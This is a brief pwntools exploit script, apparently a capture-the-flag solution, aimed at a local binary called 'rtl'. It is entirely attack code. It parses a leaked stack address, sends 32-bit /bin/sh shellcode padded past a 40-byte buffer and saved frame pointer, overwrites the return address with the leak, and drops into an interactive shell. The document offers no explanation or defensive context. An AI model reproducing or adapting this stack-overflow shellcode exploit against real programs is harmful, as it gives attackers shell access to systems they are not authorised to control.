from pwn import *

r = process('rtl')


leak = r.recvuntil('\n')[:-1]
leak = leak.decode('utf-8')
leak = int(leak, 16)  

print (leak)

r.recvline()

shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"

ex = shellcode + b'a'*(40-len(shellcode))    # buf
ex += b'a'*4  # sfp
ex += p32(leak)

r.send(ex)
r.interactive()
